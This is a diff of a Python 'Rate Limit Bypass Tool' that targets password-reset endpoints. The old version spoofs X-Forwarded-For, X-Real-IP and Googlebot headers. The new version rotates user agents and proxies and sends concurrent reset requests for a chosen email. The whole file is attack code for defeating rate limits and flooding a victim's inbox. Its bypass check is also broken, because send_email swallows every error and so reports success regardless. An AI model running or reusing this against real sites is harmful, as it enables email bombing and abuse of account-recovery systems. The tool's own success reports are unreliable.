@@ -1,77 +1,90 @@
 import requests
-import random
 import time
+import random
 import argparse
-from collections import defaultdict
+import logging
+import concurrent.futures
+from fake_useragent import UserAgent
 
-# Define common headers for bypass
-HEADERS_LIST = [
-    {"X-Forwarded-For": "127.0.0.1"},
-    {"X-Forwarded-For": "192.168.1.1"},
-    {"X-Real-IP": "127.0.0.1"},
-    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
-    {"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"},
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# List of proxies
+proxies = [
+    'http://10.10.1.10:3128',
+    'http://10.10.1.10:1080',
+    # Add more proxies as needed
 ]
 
-# Function to test rate limits
-def test_rate_limit(target_url, email):
-    print(f"\n[+] Testing Rate Limit on: {target_url}")
-    
-    results = defaultdict(int)
-    initial_responses = []
-    
-    for i in range(10):  # Send 10 requests to detect limits
-        headers = random.choice(HEADERS_LIST)
-        payload = {"email": email}  # Modify based on target form data
-        
-        response = requests.post(target_url, data=payload, headers=headers)
-        results[response.status_code] += 1
-        initial_responses.append(response.status_code)
-        
-        print(f"[-] Attempt {i+1}: Status {response.status_code} | Headers: {headers}")
+# List of email addresses
+emails = [
+    'test1@example.com',
+    'test2@example.com',
+    # Add more email addresses as needed
+]
 
-        time.sleep(random.uniform(0.5, 1.5))  # Add slight delay
+# User-Agent rotation
+ua = UserAgent()
 
-    # Detect rate limiting
-    if len(set(initial_responses)) > 1:
-        print("\n[!] Possible Rate Limit Detected!")
+def check_rate_limit(url, email):
+    response = requests.post(url, data={'email': email})
+    if 'Retry-After' in response.headers:
+        return True, int(response.headers['Retry-After'])
+    elif 'rate-limit' in response.text.lower():
+        return True, 0
     else:
-        print("\n[+] No Rate Limit Found.")
+        return False, 0
 
-    # Try bypassing if rate limit is detected
-    bypass_methods = {
-        "Header Spoofing": False,
-        "IP Rotation (Manual)": False, 
-        "Delay Variation": False
-    }
-    
-    for method, status in bypass_methods.items():
-        print(f"\n[*] Testing {method}...")
-        for i in range(5):
-            headers = random.choice(HEADERS_LIST)
-            response = requests.post(target_url, data=payload, headers=headers)
-            
-            if response.status_code in initial_responses:
-                bypass_methods[method] = True
-                print(f"[✔] {method} Successful!")
-                break
-            else:
-                print(f"[✖] {method} Failed on attempt {i+1}")
-            
-            time.sleep(random.uniform(1, 3))  # Adjust delay
-    
-    # Generate report
-    print("\n[+] Rate Limit Bypass Report:")
-    for method, status in bypass_methods.items():
-        print(f"   - {method}: {'✅ Success' if status else '❌ Failed'}")
+def send_email(url, email, headers=None, proxy=None):
+    try:
+        response = requests.post(url, data={'email': email}, headers=headers, proxies=proxy)
+        if response.status_code == 200:
+            logging.info(f"Email sent successfully to {email}")
+        else:
+            logging.warning(f"Failed to send email to {email}: {response.status_code}")
+    except Exception as e:
+        logging.error(f"Error sending email to {email}: {e}")
 
-    print("\n[+] Testing Completed.")
+def bypass_rate_limit(url, email):
+    methods = [
+        lambda: send_email(url, email, headers={'User-Agent': ua.random}),
+        lambda: send_email(url, email, headers={'User-Agent': ua.random}, proxy={'http': random.choice(proxies)}),
+        lambda: send_email(url, email, headers={'User-Agent': ua.random}, proxy={'https': random.choice(proxies)}),
+    ]
 
-# Argument parsing
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Rate Limit Bypass Testing Tool")
-    parser.add_argument("--target", required=True, help="Target URL for the rate limit test")
+    for method in methods:
+        try:
+            method()
+            logging.info("Bypassed rate limit using method")
+            return True
+        except Exception as e:
+            logging.error(f"Failed to bypass rate limit using method: {e}")
+            continue
+
+    return False
+
+def main():
+    parser = argparse.ArgumentParser(description='Rate Limit Bypass Tool')
+    parser.add_argument('--target', required=True, help='Target URL for password reset')
     args = parser.parse_args()
 
-    email = input("[?] Enter registered email: ")
-    test_rate_limit(args.target, email)
+    email = input("Enter the registered email: ")
+
+    has_rate_limit, delay = check_rate_limit(args.target, email)
+    if has_rate_limit:
+        logging.info("Rate limit found. Bypassing...")
+        bypass_rate_limit(args.target, email)
+    else:
+        logging.info("No rate limit found. Sending emails...")
+
+        # Send multiple emails concurrently
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+            futures = [executor.submit(send_email, args.target, email) for _ in range(10)]
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    future.result()
+                except Exception as e:
+                    logging.error(f"Error in sending email: {e}")
+
+if __name__ == "__main__":
+    main()
